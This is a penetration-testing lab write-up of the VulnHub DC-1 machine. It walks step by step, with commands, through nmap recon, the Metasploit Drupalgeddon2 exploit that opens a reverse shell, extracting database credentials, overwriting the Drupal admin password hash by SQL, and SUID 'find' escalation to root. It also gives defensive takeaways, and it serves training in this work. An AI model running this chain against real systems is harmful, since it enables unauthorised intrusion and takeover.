# VulnHub-DC1-Writeup
"Penetration testing lab writeups documenting full attack chains: from recon to root."
# 🔓 VulnHub: DC-1 Boot-to-Root Writeup

> **Difficulty:** Beginner-Intermediate  
> **Platform:** VulnHub  
> **Goal:** Capture all 4 flags and achieve full root-level compromise  
> **Attacker OS:** Kali Linux (VirtualBox: NAT Network)  
> **Target OS:** Debian Linux (Drupal 7 CMS)

---

## 📌 Table of Contents

1. [Lab Setup](#-lab-setup)
2. [Reconnaissance & Enumeration](#-reconnaissance--enumeration)
3. [Exploitation: Remote Code Execution](#-exploitation--remote-code-execution)
4. [Post-Exploitation: Shell Stabilization](#-post-exploitation--shell-stabilization)
5. [Flag 1: Web Server Enumeration](#-flag-1--web-server-enumeration)
6. [Flag 2: Database Credential Extraction](#-flag-2--database-credential-extraction)
7. [Flag 3: Admin Panel Access via Hash Manipulation](#-flag-3--admin-panel-access-via-hash-manipulation)
8. [Flag 4 & Root: SUID Privilege Escalation](#-flag-4--root--suid-privilege-escalation)
9. [Skills & Tools Summary](#-skills--tools-summary)
10. [Key Takeaways](#-key-takeaways)

---

## 🛠 Lab Setup

| Component | Details |
|---|---|
| Hypervisor | VirtualBox |
| Network Mode | NAT Network (both VMs on same subnet) |
| Attacker Machine | Kali Linux |
| Target Machine | DC-1 (VulnHub) |
| Target IP | `10.0.2.3` (discovered via arp-scan) |

Both virtual machines were configured under the same **NAT Network** in VirtualBox to allow inter-VM communication while maintaining an isolated lab environment.

---

## 🔍 Reconnaissance & Enumeration

### Host Discovery

Used `arp-scan` to identify all active hosts on the local subnet:

```bash
sudo arp-scan -l
```

**Result:** Target identified at `10.0.2.3`

### Service & Port Scanning

Ran a full Nmap scan with version detection and default scripts:

```bash
sudo nmap -sV -sC 10.0.2.3
```

**Key findings:**

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 6.0p1 |
| 80/tcp | HTTP | Apache 2.2.22 |
| 111/tcp | rpcbind |: |

> 🔑 **Critical:** Nmap explicitly identified the web application as **Drupal 7** via HTTP generator headers: confirming a known vulnerable CMS version.

---

## 💥 Exploitation: Remote Code Execution

### Vulnerability: Drupalgeddon2 (CVE-2018-7600)

Drupal 7 is affected by a critical **Remote Code Execution (RCE)** vulnerability in its Form API. An unauthenticated attacker can send a crafted HTTP request that the backend executes as a system command: without any authentication required.

**Launched Metasploit Framework:**

```bash
msfconsole
search drupalgeddon
use exploit/multi/http/drupal_drupageddon2
set RHOSTS 10.0.2.3
exploit
```

**Result:** Meterpreter reverse shell opened successfully as `www-data` (the web server process user).

---

## 🐚 Post-Exploitation: Shell Stabilization

Dropped from Meterpreter into a native Linux shell and stabilized it using Python PTY:

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Result:** Fully interactive bash shell as `www-data@DC-1` inside `/var/www`

---

## 🚩 Flag 1: Web Server Enumeration

```bash
ls -la /var/www
cat flag1.txt
```

**Flag 1 Contents:**
```
Every good CMS needs a config file - and so do you.
```

> 💡 **Hint:** Points directly to the Drupal configuration file: `settings.php`

---

## 🚩 Flag 2: Database Credential Extraction

Navigated to the Drupal config directory and inspected the settings file:

```bash
cd /var/www/sites/default
cat settings.php
```

**Discovered credentials embedded in the `$databases` array:**

| Field | Value |
|---|---|
| Database | `drupaldb` |
| Username | `dbuser` |
| Password | `R0ck3t` |

**Flag 2 Contents (from file comments):**
```
Brute force and dictionary attacks aren't the only ways to gain access
(and you WILL need access). What can you do with these credentials?
```

> 💡 **Hint:** Use credentials to access the MySQL backend: without brute forcing anything.

---

## 🚩 Flag 3: Admin Panel Access via Hash Manipulation

### Step 1: Database Enumeration

```bash
mysql -u dbuser -pR0ck3t
use drupaldb;
select uid, name, pass from users;
```

Found hashed passwords for `admin` and `fred`: both using Drupal's `$S$` hashing scheme (SHA-512 based).

### Step 2: Forge a Custom Password Hash

Instead of cracking the existing hash, used Drupal's own built-in PHP script to generate a new one:

```bash
cd /var/www
php scripts/password-hash.sh password123
```

**Output:** A valid `$S$D...` hash for `password123`

### Step 3: Overwrite Admin Password via SQL

```sql
use drupaldb;
update users set pass='$S$DUxDdAfJe08Z9viU5Tly0uUZXFThRFMpeBwz4T07HB6Rj0Fm2JTp' where name='admin';
```

**Logged into `http://10.0.2.3`** as `admin` / `password123` successfully.

**Flag 3 Contents (found in Drupal admin content panel):**
```
Special PERMS will help FIND the passwd - but you'll need to -exec
that command to work out how to get what's in the shadow.
```

> 💡 **Hint:** SUID binary misconfiguration on the `find` command: privilege escalation vector identified.

---

## 🚩 Flag 4 & Root: SUID Privilege Escalation

### Step 1: Enumerate System Users

```bash
cat /etc/passwd
```

Located user `flag4` with home directory at `/home/flag4`.

```bash
cat /home/flag4/flag4.txt
```

**Flag 4 Contents:**
```
Can you use this same method to find or access the flag in root?
Probably. But perhaps it's not that easy. Or maybe it is?
```

### Step 2: SUID Exploitation via `find`

The `find` binary had the **SUID bit set**, meaning it executes with the file owner's privileges (root) regardless of who runs it.

```bash
find . -exec /bin/sh \;
whoami
# root
```

### Step 3: Root Flag

```bash
cd /root
cat thefinalflag.txt
```

```
Well done!!! Hope you enjoyed DC-1!
```

**Full root compromise achieved. ✅**

---

## 🛠 Skills & Tools Summary

### Tools Used

| Tool | Purpose |
|---|---|
| `arp-scan` | Host discovery on local subnet |
| `nmap` | Port scanning & service fingerprinting |
| `Metasploit Framework` | CVE-2018-7600 exploit delivery & reverse shell |
| `MySQL CLI` | Database enumeration & credential manipulation |
| `PHP (password-hash.sh)` | Native Drupal hash generation |
| `Python PTY` | Shell stabilization |
| `VirtualBox` | Isolated lab environment setup |

### Skills Demonstrated

- ✅ Network Reconnaissance & Host Discovery
- ✅ Service Fingerprinting & CMS Identification
- ✅ CVE Research & Public Exploit Utilization
- ✅ Metasploit Framework: Payload Deployment
- ✅ Post-Exploitation & Lateral Movement
- ✅ Database Enumeration & Credential Extraction
- ✅ Password Hash Forging & SQL Injection via CLI
- ✅ Linux SUID Binary Auditing
- ✅ Privilege Escalation to Root

---

## 📚 Key Takeaways

**From an offensive perspective:**
- Unpatched CMS platforms (even 1-2 major versions behind) are trivially exploitable via public CVEs and Metasploit modules.
- Configuration files like `settings.php` frequently contain plaintext credentials that pivot an attacker from web access to full database control.
- SUID misconfigurations on common binaries like `find`, `vim`, or `python` are one of the most reliable privilege escalation vectors in Linux environments.

**From a defensive perspective:**
- Always patch CMS platforms promptly: Drupalgeddon2 had patches available; the vulnerability was the delay in applying them.
- Secrets (DB credentials) must never live in web-accessible config files without encryption or environment variable abstraction.
- Regularly audit SUID binaries: `find / -perm -4000 -type f 2>/dev/null` should be part of any Linux hardening checklist.

---

## ⚠️ Disclaimer

This writeup is strictly for **educational purposes** and documents activity performed in an **isolated, legal lab environment**. Never attempt these techniques against systems you do not own or have explicit written permission to test.

---

*Completed by [Prapul](https://linkedin.com/in/prapul123) | [TryHackMe Profile](https://tryhackme.com/p/prapul.2004) | [GitHub](https://github.com/Prapul1)*
